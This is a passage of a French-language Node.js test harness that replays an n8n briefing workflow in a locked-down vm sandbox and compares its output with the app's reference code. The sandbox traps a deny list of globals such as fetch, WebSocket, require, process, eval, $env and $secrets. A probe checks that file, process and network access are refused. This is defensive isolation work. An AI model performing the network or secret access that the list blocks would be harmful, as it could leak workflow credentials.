    'Iterator', 'JSON', 'Map', 'Math', 'Number', 'Object', 'Promise', 'Proxy', 'RangeError', 'ReferenceError', 'Reflect', 'RegExp', 'Set', 'String', 'Symbol',
    'SyntaxError', 'TypeError', 'URIError', 'Uint8Array', 'Uint8ClampedArray', 'Uint16Array', 'Uint32Array', 'WeakMap', 'WeakRef', 'WeakSet']
  // Toujours piégés, même absents du royaume : ce que n8n donne au code et que ce passage n'a pas à toucher.
  const PIEGES = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'require', 'module', 'exports', 'process', 'Buffer', 'global', 'console',
    'setTimeout', 'setInterval', 'setImmediate', 'queueMicrotask', 'helpers', '$http', '$execution', '$getWorkflowStaticData', 'getWorkflowStaticData',
    '$env', '$vars', '$secrets', '$now', '$today', 'DateTime', '$jmespath', '$workflow', '$prevNode', '$node', '$items', '$item', '$json', '$binary',
    'Function', 'eval', 'WebAssembly', 'SharedArrayBuffer', 'Atomics', 'performance', 'Temporal', 'navigator', 'crypto']
  const PREAMBULE = `(() => {
    'use strict'
    const D = JSON.parse(globalThis.__donnees); delete globalThis.__donnees
    const Chaine = String, appliquer = Reflect.apply, construire = Reflect.construct, definir = Object.defineProperty, stringify = JSON.stringify
    const noms = Object.getOwnPropertyNames, permis = new Set(${JSON.stringify(PERMIS)})
    const vues = [], echecs = []
    const note = (q) => { vues[vues.length] = Chaine(q) }
    const refus = (q) => { note(q); throw new TypeError(q + ' interdit dans un nœud Code (bac à sable du juge)') }
    const pieges = new Set()
    const pieger = (nom) => {
      if (pieges.has(nom)) return
      try { definir(globalThis, nom, { get() { return refus(nom) }, set() { refus(nom) }, configurable: false }); pieges.add(nom) } catch (e) { echecs[echecs.length] = Chaine(nom) }
    }
    // L'horloge : seul l'instant du déclencheur fait foi.
    const DateVraie = Date
    definir(DateVraie, 'now', { value: () => refus('horloge (Date.now)'), writable: false, configurable: false })
    const DateGardee = new Proxy(DateVraie, {
      construct(t, a, n) { if (!a.length) return refus('horloge (new Date())'); return construire(t, a, n) },
      apply() { return refus('horloge (Date())') },
    })
    const protoFormat = Intl.DateTimeFormat.prototype, lireFormat = Object.getOwnPropertyDescriptor(protoFormat, 'format').get, enParties = protoFormat.formatToParts
    definir(protoFormat, 'format', { get() { const f = appliquer(lireFormat, this, []); return (d) => (d === undefined ? refus('horloge (Intl sans date)') : f(d)) }, configurable: false })
    definir(protoFormat, 'formatToParts', { value: function (d) { return d === undefined ? refus('horloge (Intl sans date)') : appliquer(enParties, this, [d]) }, writable: false, configurable: false })
    const fauxConstructeur = function () { return refus('génération de code (constructeur de fonction)') }
    for (const proto of [Object.getPrototypeOf(function () {}), Object.getPrototypeOf(async function () {}), Object.getPrototypeOf(function* () {}), Object.getPrototypeOf(async function* () {})]) {
      definir(proto, 'constructor', { value: fauxConstructeur, writable: false, configurable: false })
    }
    const enItems = (l) => (l || []).map((j) => ({ json: j }))
    const $ = (nom) => {
      if (!Object.prototype.hasOwnProperty.call(D.sorties, nom)) throw new Error("le nœud n'a pas tourné : " + nom)
      const items = enItems(D.sorties[nom]); return { all: () => items, first: () => items[0] }
    }
    const entree = enItems(D.entree)
    const $input = { all: () => entree, first: () => entree[0] }
    const ceci = new Proxy({}, {
      get(_, k) { return refus('this.' + Chaine(k)) }, set(_, k) { return refus('this.' + Chaine(k)) }, has(_, k) { return refus('this.' + Chaine(k)) },
      ownKeys() { return refus('this (clés)') }, getOwnPropertyDescriptor(_, k) { return refus('this.' + Chaine(k)) },
      defineProperty(_, k) { return refus('this.' + Chaine(k)) }, deleteProperty(_, k) { return refus('this.' + Chaine(k)) },
      getPrototypeOf() { return refus('this (prototype)') }, setPrototypeOf() { return refus('this (prototype)') },
    })
    let appels = 0, resultat = null
    definir(globalThis, '__harnais', { value: (f) => {
      appels++
      if (appels > 1) { note('harnais rappelé'); return }
      try {
        const r = appliquer(f, ceci, [$, $input])
        if (r && typeof r.then === 'function') throw new Error('code asynchrone : non rejoué')
        if (!Array.isArray(r)) throw new Error("le code doit rendre une liste d'éléments")
        resultat = { items: r.map((i) => i && i.json) }
      } catch (e) { resultat = { erreur: Chaine(e && e.message || e) } }
    }, writable: false, configurable: false })
    definir(globalThis, '__resultat', { value: () => {
      let t = ''
      for (let i = 0; i < vues.length; i++) t += (i ? '\\u0001' : '') + vues[i]
      let x = ''
      for (let i = 0; i < echecs.length; i++) x += (i ? '\\u0001' : '') + echecs[i]
      return t + '\\u0000' + appels + '\\u0000' + x + '\\u0000' + stringify(resultat || { erreur: 'harnais jamais appelé' })
    }, writable: false, configurable: false })
    // La liste blanche, posée en dernier : tout nom propre du global hors de la norme devient un piège, puis les noms toujours piégés.
    for (const nom of noms(globalThis)) if (!permis.has(nom) && nom !== '__harnais' && nom !== '__resultat') pieger(nom)
    for (const nom of ${JSON.stringify(PIEGES)}) if (!permis.has(nom)) pieger(nom)
    definir(globalThis, 'Date', { value: DateGardee, writable: false, configurable: false })
  })()`

  const texte = (e) => { try { return String(e && e.message || e).slice(0, 300) } catch { return 'erreur illisible' } }
  /** Un nœud Code, dans un contexte neuf. Rend { items, erreur, violations, nonPieges }. */
  function executer(jsCode, sortiesTexte, entree) {
    const ctx = vm.createContext(vm.constants.DONT_CONTEXTIFY, { name: 'noeud-code', codeGeneration: { strings: false, wasm: false }, microtaskMode: 'afterEvaluate' })
    ctx.__donnees = '{"sorties":' + sortiesTexte + ',"entree":' + JSON.stringify(entree) + '}'
    vm.runInContext(PREAMBULE, ctx, { timeout: 2000 })
    let erreurScript = null, importTente = false
    try {
      vm.runInContext('__harnais(function ($, $input) {\n' + jsCode + '\n});', ctx, { timeout: 10000, filename: 'noeud-code.js',
        importModuleDynamically: () => { importTente = true; throw new Error('import() interdit dans un nœud Code (bac à sable du juge)') } })
    } catch (e) { erreurScript = texte(e) }
    const brut = vm.runInContext('__resultat()', ctx, { timeout: 1000 })
    if (typeof brut !== 'string') throw new Error('résultat du bac à sable illisible')
    const [vuesTexte, appels, echecsTexte, json] = brut.split('\u0000')
    const r = JSON.parse(json)
    const violations = vuesTexte ? vuesTexte.split('\u0001') : []
    if (appels !== '1') violations.push(`harnais appelé ${appels} fois`)
    if (importTente) violations.push('import()')
    return { items: r.items, erreur: erreurScript || r.erreur || null, violations, nonPieges: echecsTexte ? echecsTexte.split('\u0001') : [] }
  }
  function unNoeud(nom, jsCode, sortiesTexte, entree) {
    const r = executer(jsCode, sortiesTexte, entree)
    if (r.nonPieges.length) throw new Error(`${nom} : globaux impossibles à piéger (${r.nonPieges.join(', ')})`)
    if (r.violations.length) throw new Error(`${nom} : accès refusé par le bac à sable (${[...new Set(r.violations)].join(', ')})`)
    if (r.erreur) throw new Error(`${nom} : ${r.erreur}`)
    if (!Array.isArray(r.items) || r.items.some((x) => !x || typeof x !== 'object')) throw new Error(`${nom} : sortie illisible`)
    return r.items
  }
  /**
   * Un passage entier, du déclencheur au bilan : les nœuds Code dans le bac à sable, les nœuds HTTP par le simulateur (ou les données
   * épinglées de l'essai). `pannes` : lectures en erreur (n8n arrête alors le passage) ; `absentes` : lectures qui n'ont pas tourné,
   * pour prouver qu'aucun code ne prend une lecture manquante pour une lecture vide ; `injections` : lignes ajoutées à une lecture,
   * hors de tout filtre (données incohérentes).
   */
  function passer(m) {
    const sorties = { [m.declencheur]: [{ timestamp: m.instant }] }
    let entree = sorties[m.declencheur]
    const lectures = {}
    for (const e of m.etapes) {
      if (e.http) {
        if ((m.pannes || []).includes(e.nom)) return { arret: e.nom, raison: 'lecture en erreur', lectures }
        if ((m.absentes || []).includes(e.nom)) continue
        let lignes
        try { lignes = m.epinglees ? (m.epinglees[e.nom] || []).filter((j) => Object.keys(j).length) : SIM.lectureHttp(m.db, e.nom, e.http.parametres, e.http.executeOnce ? entree.slice(0, 1) : entree, sorties, m.base) } catch (err) { return { erreur: texte(err), noeud: e.nom, lectures } }
        if (m.injections && m.injections[e.nom]) lignes = lignes.concat(m.injections[e.nom])
        const items = lignes.length ? lignes : e.http.alwaysOutputData ? [{}] : []
        lectures[e.nom] = items
        if (!items.length) return { arret: e.nom, raison: 'aucun élément', lectures }
        sorties[e.nom] = items
        entree = items
        continue
      }
      try { entree = unNoeud(e.nom, e.code, JSON.stringify(sorties), entree) } catch (err) { return { erreur: texte(err), noeud: e.nom, lectures } }
      if (!entree.length) return { arret: e.nom, raison: 'aucun élément', lectures }
      sorties[e.nom] = entree
    }
    const garder = {}
    for (const nom of m.garder || []) garder[nom] = sorties[nom]
    return { sorties: garder, lectures: m.avecLectures ? lectures : undefined }
  }
  /** Ce que l'enfant lui-même peut faire : chaque geste doit être refusé par le modèle de permissions de Node. */
  function sonder(m) {
    const r = {}
    const essai = (k, f) => { try { f(); r[k] = 'PERMIS' } catch (e) { r[k] = (e && e.code) || texte(e) } }
    essai('ecriture', () => fs.writeFileSync(chemin.join(os.tmpdir(), 'briefing-n8n-qa-sonde.txt'), 'x'))
    essai('lecture', () => fs.readFileSync(m.fichier))
    essai('processus', () => processus.spawnSync(process.execPath, ['-v']))
    essai('worker', () => new fils.Worker('1', { eval: true }))
    r.permission = typeof process.permission === 'object' && process.permission !== null
    // Réseau : Node 25 et suivants refusent dès l'appel (ERR_ACCESS_DENIED, sans `--allow-net`) ; Node 24 n'a pas ce barrage. Essai vers
    // la boucle locale seulement (port 9, « discard »), refermé aussitôt.
    try { const s = reseau.connect({ port: 9, host: '127.0.0.1' }); s.on('error', () => {}); s.destroy(); r.reseau = 'PERMIS' } catch (e) { r.reseau = (e && e.code) || texte(e) }
    r.node = process.version
    // Le royaume d'un nœud : chaque nom hors liste blanche est-il bien piégé ?
    const c = executer('return [{ json: {} }];', '{}', [{}])
    r.nonPieges = c.nonPieges
    r.noeudVide = c.erreur || (c.violations.length ? c.violations.join(', ') : 'ok')
    return r
  }
  process.on('message', (m) => {
    let rep
    try {
      const valeur = m.type === 'passer' ? passer(m) : m.type === 'executer' ? executer(m.jsCode, m.sorties || '{}', m.entree || [{}]) : m.type === 'sonde' ? sonder(m) : null
      rep = { id: m.id, ok: true, valeur }
    } catch (e) { rep = { id: m.id, ok: false, erreur: texte(e) } }
    process.send(rep)
  })
}
const CODE_ENFANT = '(' + enfant.toString() + ')(' + simulateur.toString() + ', ' + EXPRESSIONS_SOURCE + ')'

class BacASable {
  constructor() {
    const permission = process.allowedNodeEnvironmentFlags.has('--permission') ? '--permission' : '--experimental-permission'
    // `--experimental-vm-modules` : sans lui, import() est rejeté sans que le rappel du juge le voie ; avec lui, le rappel le note et le refuse.
    this.drapeaux = [permission, '--disallow-code-generation-from-strings', '--experimental-vm-modules', '--no-warnings']
    const env = {}
    if (process.env.SystemRoot) env.SystemRoot = process.env.SystemRoot
    this.p = spawn(process.execPath, [...this.drapeaux, '--max-old-space-size=2048', '-e', CODE_ENFANT], { stdio: ['ignore', 'ignore', 'pipe', 'ipc'], env, serialization: 'json', windowsHide: true })
    this.attente = new Map()
    this.n = 0
    this.erreurs = ''
    this.p.stderr.on('data', (d) => { this.erreurs = (this.erreurs + d).slice(-2000) })
    this.p.on('message', (m) => { const a = this.attente.get(m.id); if (!a) return; this.attente.delete(m.id); if (m.ok) a.ok(m.valeur); else a.ko(new Error(m.erreur)) })
    this.p.on('exit', (code) => {
      this.arrete = true
      for (const a of this.attente.values()) a.ko(new Error(`bac à sable arrêté (code ${code}) ${this.erreurs.slice(0, 300)}`))
      this.attente.clear()
    })
  }
  demander(m) {
    if (this.arrete) return Promise.reject(new Error(`bac à sable arrêté ${this.erreurs.slice(0, 300)}`))
    return new Promise((ok, ko) => { const id = ++this.n; this.attente.set(id, { ok, ko }); this.p.send({ ...m, id }) })
  }
  fermer() { this.p.kill() }
}
const BAC = new BacASable()

// ─── 2. Le passage rejoué, et les copies figées comparées au code ──────────────────────────────────────────────────────────────
const RUBRIQUES = ['conversations', 'devis_sans_reponse', 'impayes', 'stock_bas'] // l'ordre de composerBriefing (briefing.ts:52-72)
const ORDRE_Q1 = ['impayes', 'conversations', 'devis_sans_reponse', 'stock_bas'] // Q1, défaut : l'argent qui dort d'abord (P3:584)
const HORS_N8N = ['chantiers_du_jour', 'chantiers_en_retard', 'a_facturer'] // briefing.ts:74-81, hors de ce lot (Q4)
const CAPACITES_LUES = ['assistant', 'chiffres', 'inventaire.stock', 'crm']
const OFFRES = ['studio', 'signature', 'entreprise']
const LISTE_MAX = Number(/const LISTE_MAX = (\d+)/.exec(lire(path.join(RACINE, 'lib/assistant/briefing.ts')))?.[1])
// Les limites des lectures de l'app : chacune est cherchée telle quelle dans le code qu'elle copie.
const LIMITES_APP = {
  demandes: [200, 'lib/assistant/executeurs.ts', ".eq('artisan_id', ctx.uid).order('updated_at', { ascending: false, nullsFirst: false }).limit(200)"],
  paquet_demandes: [100, 'lib/assistant/executeurs.ts', 'for (let i = 0; i < ouverts.length; i += 100)'],
  messages_par_paquet: [1000, 'lib/assistant/executeurs.ts', ".order('sent_at', { ascending: false }).limit(1000)"],
  conversations: [50, 'lib/assistant/executeurs.ts', 'lecture.lire_conversations({ en_attente_seulement: true, client: null, limite: 50 })'],
  impayes_listes: [50, 'lib/assistant/executeurs.ts', 'lecture.lire_factures({ statut: null, impayees_seulement: true, client: null, limite: 50 })'],
  devis: [200, 'lib/assistant/executeurs.ts', ".eq('statut', 'envoye').order('envoye_le', { ascending: true }).limit(200)"],
  factures: [2000, 'app/api/compta/tableau/route.ts', 'const LIMITE = 2000'],
  lignes_par_page: [1000, null, null],
  pages_max: [50, null, null],
}
const etapes = (wf) => CHAINE.slice(1).map(([nom, type]) => {
  const n = noeud(wf, nom)
  if (!n) throw new Error(`nœud absent : ${nom}`)
  return type === T.http ? { nom, http: { parametres: n.parameters, executeOnce: n.executeOnce === true, alwaysOutputData: n.alwaysOutputData === true } } : { nom, code: n.parameters?.jsCode ?? '' }
})
const GARDER = ['Point du jour par compte', 'Bilan du passage']
/** Un passage du workflow, rejoué dans le processus enfant. */
const rejouer = (wf, base, instant, o = {}) => BAC.demander({ type: 'passer', declencheur: DECLENCHEUR, instant, etapes: etapes(wf), db: base.db, base: BASE, garder: GARDER, ...o })

/** L'horodatage du déclencheur pour une heure de Paris, comme n8n l'écrit (« 2026-11-03T07:30:00.000+01:00 »). */
function horodateParis(jour, h, mi, s = 0) {
  const fmt = new Intl.DateTimeFormat('en-GB', { timeZone: 'Europe/Paris', hour: '2-digit', minute: '2-digit', hourCycle: 'h23', year: 'numeric', month: '2-digit', day: '2-digit' })
  for (const decalage of [1, 2]) {
    const ms = Date.UTC(+jour.slice(0, 4), +jour.slice(5, 7) - 1, +jour.slice(8, 10), h - decalage, mi, s)
    const p = Object.fromEntries(fmt.formatToParts(new Date(ms)).map((x) => [x.type, x.value]))
    if (`${p.year}-${p.month}-${p.day}` === jour && +p.hour === h && +p.minute === mi) {
      const l = new Date(ms + decalage * 3600e3).toISOString().slice(0, 19)
      return `${l}.000+0${decalage}:00`
    }
  }
  throw new Error(`heure de Paris inexistante : ${jour} ${h}:${mi}`)
}
/** Un horodatage Postgres (« …+00:00 »), à `ms` près, avec des microsecondes si demandées. */
const horodate = (ms, micro = null) => { const iso = new Date(ms).toISOString(); return micro === null ? iso.slice(0, 19) + '+00:00' : iso.slice(0, 19) + '.' + String(micro).padStart(6, '0') + '+00:00' }
const msParis = (jour, h, mi) => Date.parse(horodateParis(jour, h, mi))

async function copies(wf) {
  const e = []
  const ko = (m) => e.push(m)
  const un = async (nom, sorties) => {
    const r = await BAC.demander({ type: 'executer', jsCode: codeDe(wf, nom), sorties: JSON.stringify(sorties), entree: [{}] })
    if (r.violations.length) throw new Error(`accès refusé par le bac à sable (${[...new Set(r.violations)].join(', ')})`)
    if (r.erreur) throw new Error(r.erreur)
    return r.items[0]
  }
  try {
    const cap = (await un('Capacités des offres', {})).capacites ?? {}
    if (!memes(Object.keys(cap), OFFRES)) ko('copie des capacités : Studio, Signature et Entreprise seulement')
    for (const offre of OFFRES) {
      if (!clesExactes(cap[offre], CAPACITES_LUES)) { ko(`copie des capacités « ${offre} » : ${CAPACITES_LUES.join(', ')} attendues`); continue }
      for (const c of CAPACITES_LUES) if (cap[offre][c] !== peut(offre, c)) ko(`copie des capacités faussée : ${offre}.${c} vaut ${cap[offre][c]}, peut() rend ${peut(offre, c)} (lib/plans.ts)`)
    }
    if (!PLANS.studio || !PLANS.signature || !PLANS.entreprise) ko('lib/plans.ts : offre attendue absente')
  } catch (err) { ko(`Capacités des offres : ${err.message}`) }
  try {
    // Le jour de Paris, autour de minuit et des changements d'heure, égal à jourParis (lib/comptaTableau.ts:159-160).
    for (const t of ['2026-11-03T07:30:00.000+01:00', '2026-10-24T23:30:00.000+02:00', '2026-10-25T00:30:00.000+02:00', '2026-10-25T07:30:00.000+01:00',
      '2026-03-29T07:30:00.000+02:00', '2026-03-28T23:59:59.000+01:00', '2026-12-31T23:30:00.000+01:00', '2026-07-08T00:10:00.000+02:00']) {
      const c = await un('Contexte du passage', { [DECLENCHEUR]: [{ timestamp: t }] })
      if (c.jour !== jourParis(new Date(t))) ko(`jour du passage ${c.jour} pour ${t}, jourParis rend ${jourParis(new Date(t))}`)
      if (c.instant !== new Date(t).toISOString()) ko(`instant du passage ${c.instant} pour ${t}`)
    }
    const c = await un('Contexte du passage', { [DECLENCHEUR]: [{ timestamp: '2026-11-03T07:30:00.000+01:00' }] })
    if (c.mode !== 'simulation') ko('mode simulation attendu')
    const s = c.seuils ?? {}
    if (!clesExactes(s, ['devis_sans_reponse_jours', 'impaye_urgent_jours', 'lignes_max'])) ko('seuils hors liste')
    if (s.devis_sans_reponse_jours !== DEVIS_SANS_REPONSE_JOURS) ko(`seuil des devis sans réponse ${s.devis_sans_reponse_jours}, DEVIS_SANS_REPONSE_JOURS = ${DEVIS_SANS_REPONSE_JOURS} (lib/assistant/briefing.ts:35)`)
    if (s.impaye_urgent_jours !== IMPAYE_URGENT_JOURS) ko(`seuil de l'impayé urgent ${s.impaye_urgent_jours}, IMPAYE_URGENT_JOURS = ${IMPAYE_URGENT_JOURS} (lib/assistant/briefing.ts:37)`)
    if (!Number.isInteger(LISTE_MAX) || s.lignes_max !== LISTE_MAX) ko(`lignes montrées ${s.lignes_max}, LISTE_MAX = ${LISTE_MAX} (lib/assistant/briefing.ts:38)`)
    if (!clesExactes(c.limites, Object.keys(LIMITES_APP))) ko('limites hors liste')
    for (const [k, [v, fichier, texte]] of Object.entries(LIMITES_APP)) {
      if (c.limites?.[k] !== v) ko(`limite ${k} : ${c.limites?.[k]}, ${v} attendu`)
      if (fichier && !lire(path.join(RACINE, fichier)).includes(texte)) ko(`limite ${k} : la lecture de l'app a changé (${fichier}) — copie à revoir`)
    }
    const pg = PAGINATION.pagination
    if (pg.maxRequests !== c.limites?.pages_max) ko('pages_max différent du plafond de pagination des gabarits')
    // Une instant illisible arrête le passage (jamais l'horloge du serveur en repli).
    const r = await BAC.demander({ type: 'executer', jsCode: codeDe(wf, 'Contexte du passage'), sorties: JSON.stringify({ [DECLENCHEUR]: [{}] }), entree: [{}] })
    if (!r.erreur) ko('Contexte du passage : un déclencheur sans instant doit arrêter le passage')
  } catch (err) { ko(`Contexte du passage : ${err.message}`) }
  return e
}

// ─── 3. La référence : la vraie chaîne de l'app, sur les mêmes lignes ──────────────────────────────────────────────────────────
// Les lectures sont celles de l'app (même table, même filtre, même ordre, même limite), jouées par le même simulateur ; les calculs
// sont les fonctions pures de l'app, importées. Le CRM n'entre pas (Q4) : composerBriefing est appelé sans `crm`, comme lorsque la
// lecture du CRM échoue (lib/assistant/executeurs.ts:268-275) ; ses rubriques viennent APRÈS les quatre comparées (briefing.ts:74-81).
const ELIGIBLE = (a) => OFFRES.includes(a.plan) && a.est_demo === false && (a.suppression_demandee_le === null || a.suppression_demandee_le === undefined)
function briefingApp(base, instantTexte) {
  const db = base.db
  const maintenant = new Date(instantTexte)
  const jourIso = jourParis(maintenant)
  const [a, m, j] = jourIso.split('-')
  const comptes = new Map()
  for (const compte of [...db.artisans].sort((x, y) => (x.id < y.id ? -1 : 1))) {
    if (!ELIGIBLE(compte) || comptes.has(compte.id)) continue
    const uid = compte.id, plan = compte.plan
    if (!peut(plan, 'assistant')) { comptes.set(uid, { horsOffre: true }); continue }
    // lire_conversations (lib/assistant/executeurs.ts:161-179)
    const leads = SIM.requete(db.leads, { filtres: [['artisan_id', 'eq', uid]], ordre: [['updated_at', true, false]], limite: 200 })
    const ouverts = leads.filter((l) => l.statut !== 'gagne' && l.statut !== 'perdu')
    const messages = []
    for (let i = 0; i < ouverts.length; i += 100) {
      messages.push(...SIM.requete(db.messages, { filtres: [['lead_id', 'in', ouverts.slice(i, i + 100).map((l) => l.id)], ['etat', 'etat_vide_ou_proposition']], ordre: [['sent_at', true, true]], limite: 1000 }))
    }
    const conv = resumerConversations(ouverts, messages, { en_attente_seulement: true, client: null, limite: 50 })
    // lire_factures → GET /api/compta/tableau (app/api/compta/tableau/route.ts:26, :37), resumerFactures
    const fact = peut(plan, 'chiffres') ? resumerFactures({ maintenant: maintenant.toISOString(), factures: SIM.requete(db.factures, { filtres: [['artisan_id', 'eq', uid]], ordre: [['date_emission', true, true], ['id', false, false]], limite: 2000 }), devis: [], demandes: [] }, uid, { statut: null, impayees_seulement: true, client: null, limite: 50 }) : null
    // lire_stock → GET /api/inventaire (app/api/inventaire/route.ts:23, :55-75), resumerStock
    let stock = null, epuisesTous = [], alertesToutes = []
    if (peut(plan, 'inventaire.stock')) {
      const materiaux = SIM.requete(db.materiaux, { filtres: [['artisan_id', 'eq', uid]], ordre: [['nom', false, false], ['id', false, false]], limite: 5000 })
        .map((x) => ({ ...x, stock: SIM.requete(db.stock, { filtres: [['materiau_id', 'eq', x.id]] }).map((s) => ({ lieu: s.lieu, quantite: s.quantite })) }))
      // Recopié de app/api/inventaire/route.ts:67-75.
      const total = (x) => (x.stock ?? []).reduce((s, l) => s + Number(l.quantite), 0)
      const alertes = materiaux.filter((x) => Number(x.seuil_alerte) > 0 && total(x) <= Number(x.seuil_alerte))
      stock = resumerStock({ materiaux: materiaux.map((x) => ({ ...x, quantite_totale: total(x) })), alertes: alertes.map((x) => ({ id: x.id, nom: x.nom, unite: x.unite, reste: total(x), seuil: Number(x.seuil_alerte) })) }, { recherche: null })
      alertesToutes = alertes.map((x) => x.id)
      epuisesTous = stock.alertes.map((x, i) => [x, alertes[i].id]).filter(([x]) => x.reste !== null && x.reste <= 0).map(([, id]) => id)
    }
    // briefing_du_matin : les devis (lib/assistant/executeurs.ts:264, :276-277)
    const devis = SIM.requete(db.devis, { filtres: [['artisan_id', 'eq', uid], ['statut', 'eq', 'envoye']], ordre: [['envoye_le', false, false]], limite: 200 })
      .map((d) => ({ numero: d.numero, client: null, total_ttc: d.total_ttc === null ? null : Number(d.total_ttc), envoye_le: d.envoye_le ? jourParis(new Date(d.envoye_le)) : null }))
    const b = composerBriefing({
      jour: `${j}/${m}/${a}`, jourIso,
      conversations: conv ?? { nb_en_attente: 0, conversations: [] },
      devis,
      factures: fact ?? { impayes: { nombre: 0, en_retard: 0, total: { euros: 0, texte: '0,00 €' }, liste: [] } },
      stock: stock ?? { nb_alertes: 0, alertes: [] },
    })
    comptes.set(uid, { b, fact, stock, alertesToutes, epuisesTous, crm: peut(plan, 'crm') })
  }
  return { jour: jourIso, comptes }
}

// Les noms fictifs : un jeton de lettres par objet (« jtabcdefg »), relu dans les lignes de composerBriefing pour retrouver l'objet
// sans recoder ses tris (les chiffres d'un identifiant seraient masqués comme un téléphone par encadrerClient).
const RE_JETON = /jt[a-z]{7}/
const jeton = (k) => { let s = ''; for (let i = 0; i < 7; i++) { s = String.fromCharCode(97 + (k % 26)) + s; k = Math.floor(k / 26) } return 'jt' + s }
const objetDe = (base, ligne) => { const t = RE_JETON.exec(ligne)?.[0]; const id = t && base.jetons[t]; if (!id) throw new Error(`ligne sans objet reconnu : ${ligne.slice(0, 80)}`); return id }
const rubriqueDUrgence = (u) => (u.startsWith('Demande urgente') ? 'conversations' : u.startsWith('Facture') ? 'impayes' : u.startsWith('Stock épuisé') ? 'stock_bas' : null)

/** Ce que la sortie de n8n doit dire, compte par compte, d'après la référence. */
function attendu(base, app) {
  const comptes = new Map()
  for (const [id, r] of app.comptes) {
    if (r.horsOffre) { comptes.set(id, { horsOffre: true }); continue }
    const sections = r.b.sections.filter((s) => RUBRIQUES.includes(s.cle))
    if (sections.length !== r.b.sections.length) throw new Error('composerBriefing a rendu une rubrique inattendue')
    const rubriques = sections.map((s) => ({ rubrique: s.cle, nombre: s.nombre, lignes_non_montrees: s.lignes_non_montrees, objets: s.lignes.map((l) => objetDe(base, l)) }))
    const urgences = r.b.urgences.map((x) => ({ rubrique: rubriqueDUrgence(x), id: objetDe(base, x) }))
    const c = r.b.chiffres
    comptes.set(id, {
      muet: !rubriques.length,
      crm: r.crm,
      rubriques,
      urgences: { nombre: r.b.nb_urgences, objets: urgences },
      alertesToutes: r.alertesToutes, epuisesTous: r.epuisesTous,
      chiffres: {
        conversations_en_attente: c.conversations_en_attente, devis_sans_reponse: c.devis_sans_reponse,
        factures_impayees: r.fact ? c.factures_impayees : null, factures_echues: r.fact ? c.factures_echues : null,
        total_impaye_centimes: r.fact ? Math.round(c.total_impaye.euros * 100) : null, alertes_de_stock: r.stock ? c.alertes_de_stock : null,
      },
      horsOffreR: [r.fact ? null : 'impayes', r.stock ? null : 'stock_bas'].filter(Boolean),
    })
  }
  return comptes
}

// ─── 4. La sortie : liste blanche des clés, chaînes fermées ─────────────────────────────────────────────────────────────────────
const CLES = {
  point: ['mode', 'jour', 'comptes_lus', 'comptes_hors_offre', 'comptes_muets', 'comptes_muets_crm', 'a_ecrire'],
  ligne: ['cle', 'artisan_id', 'jour', 'mode', 'priorites', 'point_du_jour'],
  priorite: ['rang', 'rubrique', 'nombre', 'premier_objet'],
  pointDuJour: ['rubriques', 'urgences', 'chiffres', 'rubriques_hors_n8n', 'rubriques_hors_offre'],
  rubrique: ['rubrique', 'nombre', 'lignes_non_montrees', 'objets'],
  urgences: ['nombre', 'objets'],
  urgence: ['rubrique', 'id'],
  chiffres: ['conversations_en_attente', 'devis_sans_reponse', 'factures_impayees', 'factures_echues', 'total_impaye_centimes', 'alertes_de_stock'],
  bilan: ['mode', 'jour', 'comptes_lus', 'comptes_avec_point_du_jour', 'comptes_muets', 'comptes_muets_rubriques_hors_n8n', 'comptes_hors_offre', 'priorites_par_rubrique'],
  parRubrique: ['impayes', 'conversations', 'devis_sans_reponse', 'stock_bas'],
}
// Les seules valeurs de texte permises (M11) : une énumération fermée, une date ISO, un identifiant, la clé du point du jour.
const ENUMERATION = new Set(['simulation', ...RUBRIQUES, ...HORS_N8N])
const RE_JOUR = /^\d{4}-\d{2}-\d{2}$/
const RE_CLE = /^point_du_jour:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}:\d{4}-\d{2}-\d{2}$/
function verifierSortie(titre, point, bilan, ko, { uuidInventes = true } = {}) {
  const forme = (o, cles, ou) => { if (!clesExactes(o, cles)) ko(`${titre} : ${ou} hors liste blanche (${o && typeof o === 'object' ? Object.keys(o).join(', ') : typeof o})`) }
  const parcourir = (v, ou) => {
    if (v === null || typeof v === 'boolean') return
    if (typeof v === 'number') { if (!Number.isInteger(v) || v < 0) ko(`${titre} : ${ou} : nombre ${v} hors des entiers positifs`); return }
    if (typeof v === 'string') {
      const ok = ENUMERATION.has(v) || RE_JOUR.test(v) || (UUID.test(v) && (!uuidInventes || UUID_INVENTE.test(v))) || RE_CLE.test(v)
      if (!ok) ko(`${titre} : ${ou} : texte hors énumération, date ou identifiant (${v.slice(0, 60)})`)
      const bas = v.toLowerCase()
      for (const mot of MOTS_INTERDITS) if (new RegExp(`(^|[^a-zà-ÿ])${mot}([^a-zà-ÿ]|$)`).test(bas)) ko(`${titre} : ${ou} : mot interdit « ${mot} » dans une valeur`)
      return
    }
    if (Array.isArray(v)) { v.forEach((x, i) => parcourir(x, `${ou}[${i}]`)); return }
    if (typeof v === 'object') { for (const [k, x] of Object.entries(v)) parcourir(x, `${ou}.${k}`); return }
    ko(`${titre} : ${ou} : valeur de type ${typeof v}`)
  }
  if (!Array.isArray(point) || point.length !== 1) { ko(`${titre} : « Point du jour par compte » doit rendre un seul élément`); return }
  if (!Array.isArray(bilan) || bilan.length !== 1) { ko(`${titre} : le bilan doit rendre un seul élément`); return }
  const p = point[0], b = bilan[0]
  forme(p, CLES.point, 'point du jour')
  for (const l of Array.isArray(p.a_ecrire) ? p.a_ecrire : []) {
    forme(l, CLES.ligne, 'ligne à écrire')
    for (const x of l.priorites ?? []) forme(x, CLES.priorite, 'priorité')
    forme(l.point_du_jour, CLES.pointDuJour, 'point_du_jour')
    for (const x of l.point_du_jour?.rubriques ?? []) forme(x, CLES.rubrique, 'rubrique')
    forme(l.point_du_jour?.urgences, CLES.urgences, 'urgences')
    for (const x of l.point_du_jour?.urgences?.objets ?? []) forme(x, CLES.urgence, 'urgence')
    forme(l.point_du_jour?.chiffres, CLES.chiffres, 'chiffres')
  }
  forme(b, CLES.bilan, 'bilan')
  forme(b?.priorites_par_rubrique, CLES.parRubrique, 'bilan.priorites_par_rubrique')
  parcourir(p, 'point du jour')
  parcourir(b, 'bilan')
  if (p.mode !== 'simulation' || b.mode !== 'simulation') ko(`${titre} : mode simulation attendu`)
}

/** La sortie de n8n contre la référence : rubriques, ordre, nombres, objets, urgences, chiffres, priorités, silence, bilan. */
function comparer(titre, base, app, sortie, ko) {
  const point = sortie?.['Point du jour par compte'], bilan = sortie?.['Bilan du passage']
  verifierSortie(titre, point, bilan, ko)
  if (!point?.[0] || !bilan?.[0]) return
